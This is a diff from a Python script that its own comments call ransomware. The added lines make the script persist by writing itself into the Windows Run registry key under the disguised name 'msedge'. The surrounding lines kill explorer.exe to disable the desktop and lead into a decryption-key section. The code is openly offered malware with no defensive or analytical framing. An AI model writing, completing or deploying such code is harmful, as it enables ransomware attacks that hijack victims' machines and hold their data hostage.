@@ -20,6 +20,22 @@ data = struct.pack('<' + 'B' * len(hex_values), *hex_values)
 
 # Print the Registry data
 print(data)
+# Add ransomware program to run at startup
+def add_to_startup():
+    key = winreg.HKEY_CURRENT_USER
+    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+    program_name = "msedge"
+    program_path = os.path.abspath(__file__)
+
+    try:
+        with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as registry_key:
+            winreg.SetValueEx(registry_key, program_name, 0, winreg.REG_SZ, program_path)
+    except Exception as e:
+        print(f"Error adding to startup: {e}")
+
+# Call the function to add ransomware program to startup
+add_to_startup()
+
 os.system("taskkill /f /im explorer.exe")  # KILLING  THE GUI INTARCE
 
 # GENERATE A KEY FOR DECRYPTION
